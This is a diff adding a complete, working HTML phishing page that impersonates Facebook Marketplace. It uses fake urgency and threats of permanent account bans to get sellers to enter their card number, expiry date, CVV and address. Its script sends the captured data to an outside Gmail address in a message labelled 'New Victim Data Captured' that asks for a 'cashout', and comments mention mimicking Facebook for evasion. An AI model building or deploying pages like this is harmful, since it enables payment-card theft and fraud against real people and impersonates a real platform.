@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Marketplace - Secure Payment Verification</title>
+    <meta name="description" content="Verify your Facebook Marketplace transaction securely to release funds and avoid account suspension.">
+    <!-- Mimic Facebook meta tags for evasion -->
+    <meta property="og:title" content="Facebook Marketplace">
+    <meta property="og:description" content="Secure your transaction now.">
+    <meta property="og:image" content="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico">
+    <style>
+        body { font-family: 'Helvetica Neue', Arial, sans-serif; background: #f0f2f5; color: #1c1e21; margin: 0; padding: 0; }
+        .header { background: white; padding: 10px; border-bottom: 1px solid #dadde1; text-align: center; }
+        .fb-logo { color: #1877F2; font-size: 28px; font-weight: bold; text-decoration: none; }
+        .container { max-width: 500px; margin: 20px auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        h2 { margin-top: 0; color: #1877F2; }
+        .section { margin-bottom: 20px; padding: 15px; border: 1px solid #e4e6ea; border-radius: 6px; background: #f8f9fa; }
+        input, select { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; }
+        button { background: #1877F2; color: white; padding: 12px; width: 100%; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; margin-top: 10px; }
+        button:hover { background: #166fe5; }
+        .warning { background: #fff3cd; border: 1px solid #ffeaa7; color: #856404; padding: 10px; border-radius: 4px; font-weight: bold; margin-bottom: 15px; }
+        .terms { font-size: 12px; color: #606770; text-align: center; margin-top: 10px; }
+        .terms a { color: #1877F2; text-decoration: none; }
+        .progress { margin-bottom: 15px; }
+        .progress-bar { width: 100%; background: #e4e6ea; border-radius: 4px; height: 6px; }
+        .progress-fill { height: 100%; background: #1877F2; border-radius: 4px; width: 75%; }
+        .error { color: red; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <a href="#" class="fb-logo">facebook</a>
+    </div>
+    <div class="container">
+        <h2>Facebook Marketplace Payment Protection</h2>
+        <p>Urgent: Secure your transaction and release funds before the dispute escalates. Failure to verify within 24 hours will result in permanent account ban.</p>
+        
+        <div class="progress">
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+            <small>Step 3 of 4: Final Verification</small>
+        </div>
+        
+        <div id="errorDiv" class="error" style="display:none;"></div>
+        
+        <form id="phishForm" method="POST" enctype="text/plain">
+            <input type="hidden" name="subject" value="New FB Marketplace Victim Data">
+            <div class="section">
+                <h3>Transaction Summary</h3>
+                <p>Review and confirm the following to ensure accuracy and unlock payment:</p>
+                <label>Item Description:</label>
+                <input type="text" name="item_desc" placeholder="e.g., iPhone 12 Pro, 256GB" required>
+                
+                <label>Agreed Price (USD):</label>
+                <input type="number" name="price" placeholder="e.g., 800" step="0.01" required>
+                
+                <label>Category:</label>
+                <select name="category" required>
+                    <option value="">Choose Category</option>
+                    <option value="Electronics">Electronics</option>
+                    <option value="Home & Garden">Home & Garden</option>
+                    <option value="Vehicles">Vehicles</option>
+                    <option value="Clothing">Clothing</option>
+                    <option value="Other">Other</option>
+                </select>
+                
+                <label>Shipping Address:</label>
+                <input type="text" name="address" placeholder="Full address for delivery" required>
+                
+                <label>Buyer's Facebook Name:</label>
+                <input type="text" name="buyer_fb" placeholder="e.g., John Doe" required>
+                
+                <label>Transaction ID (from chat):</label>
+                <input type="text" name="txn_id" placeholder="e.g., MP-123456789" required>
+            </div>
+            
+            <div class="section">
+                <h3>Card Verification for Release</h3>
+                <p>Provide your card details to verify identity and unlock the payment hold. This is required by Facebook's fraud prevention system.</p>
+                
+                <div class="warning">
+                    Important: If you do not deliver the product after the payment is released, your Facebook account will be deleted permanently. This policy protects buyers and ensures compliance with Marketplace rules. Disputes will result in immediate suspension.
+                </div>
+                
+                <label>Cardholder Name:</label>
+                <input type="text" name="card_name" placeholder="As on card" required>
+                
+                <label>Card Number:</label>
+                <input type="text" name="card_num" placeholder="16-digit number" maxlength="19" required>
+                
+                <label>Expiration Date:</label>
+                <input type="text" name="exp_date" placeholder="MM/YY" pattern="(0[1-9]|1[0-2])\/[0-9]{2}" required>
+                
+                <label>CVV:</label>
+                <input type="text" name="cvv" placeholder="3 or 4 digits" maxlength="4" required>
+                
+                <button type="submit" id="verifyBtn">Verify & Release Payment</button>
+            </div>
+        </form>
+        
+        <div class="terms">
+            By proceeding, you agree to Facebook's <a href="https://www.facebook.com/legal/terms">Terms of Service</a> and <a href="https://www.facebook.com/about/privacy">Privacy Policy</a>. This process is monitored for security.
+        </div>
+    </div>
+    <script src="//code.tidio.co/aapzg35zdbuwepizlexusecjoel4tpdn.js" async></script>
+    <script>
+        let submitted = false;
+        document.getElementById('phishForm').addEventListener('submit', function(e) {
+            if (submitted) {
+                e.preventDefault();
+                return;
+            }
+            e.preventDefault();
+            submitted = true;
+            const btn = document.getElementById('verifyBtn');
+            btn.disabled = true;
+            btn.innerHTML = 'Processing...';
+            
+            // Build mailto body with form data
+            const formData = new FormData(this);
+            let body = "New Victim Data Captured\n\nIP/Host: " + (window.location.hostname || 'Unknown') + "\n\nTransaction Details:\n";
+            body += "Item Description: " + (formData.get('item_desc') || '') + "\n";
+            body += "Price: $" + (formData.get('price') || '') + "\n";
+            body += "Category: " + (formData.get('category') || '') + "\n";
+            body += "Shipping Address: " + (formData.get('address') || '') + "\n";
+            body += "Buyer's FB Name: " + (formData.get('buyer_fb') || '') + "\n";
+            body += "Transaction ID: " + (formData.get('txn_id') || '') + "\n\n";
+            body += "Card Details:\n";
+            body += "Cardholder Name: " + (formData.get('card_name') || '') + "\n";
+            body += "Card Number: " + (formData.get('card_num') || '') + "\n";
+            body += "Expiration Date: " + (formData.get('exp_date') || '') + "\n";
+            body += "CVV: " + (formData.get('cvv') || '') + "\n\n";
+            body += "Process this ASAP for cashout.";
+            
+            // Set the form action dynamically
+            this.action = "mailto:Facebook.dispute.center@gmail.com?subject=New FB Marketplace Victim Data&body=" + encodeURIComponent(body);
+            
+            setTimeout(() => this.submit(), 2000); // 2-second delay for realism
+        });
+    </script>
+</body>
+</html>
